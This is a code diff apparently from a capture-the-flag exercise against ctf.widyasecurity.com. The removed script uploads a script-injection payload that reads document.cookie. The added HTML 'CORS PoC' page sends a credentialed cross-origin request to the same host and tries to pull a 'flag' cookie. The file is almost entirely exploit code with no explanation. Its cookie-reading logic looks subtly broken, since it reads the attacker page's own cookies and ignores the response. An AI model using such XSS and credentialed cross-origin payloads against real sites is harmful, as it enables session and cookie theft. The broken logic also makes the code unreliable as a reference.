@@ -1,32 +1,24 @@
-window.onload = function() {
-    var xhr = new XMLHttpRequest();
-    var formData = new FormData();
-
-    // Constructing the payload with the desired script injection
-    var payload = "</script><script>alert(document.cookie)</script>";
-
-    // Creating a blob with the payload
-    var blob = new Blob([payload], { type: 'text/plain' });
-
-    formData.append('qrcode', blob);
-
-    xhr.open('POST', 'http://ctf.widyasecurity.com/upload', true);
-    xhr.setRequestHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9');
-    xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
-    xhr.withCredentials = true;
-
-    xhr.onload = function() {
-        if (xhr.status === 200) {
-            console.log('Payload sent successfully');
-            // Optionally redirect or perform other actions on success
-        } else {
-            console.error('Payload failed to send. Status: ' + xhr.status);
-        }
-    };
-
-    xhr.onerror = function() {
-        console.error('Request failed');
-    };
-
-    xhr.send(formData);
-};
+<html>
+  <!-- CORS PoC to Retrieve the Flag -->
+  <body>
+    <h2>CORS PoC</h2>
+    <div id="demo">
+        <button type="button" onclick="corsRequest()">Exploit</button>
+    </div>
+    <script>
+      function corsRequest() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "http://ctf.widyasecurity.com/upload", true);
+        xhr.withCredentials = true;
+        xhr.onreadystatechange = function() {
+          if (this.readyState == 4 && this.status == 200) {
+            // Assuming the flag is stored in a cookie named 'flag'
+            var flag = document.cookie.split('; ').find(row => row.startsWith('flag=')).split('=')[1];
+            alert('Flag: ' + flag);
+          }
+        };
+        xhr.send();
+      }
+    </script>
+  </body>
+</html>
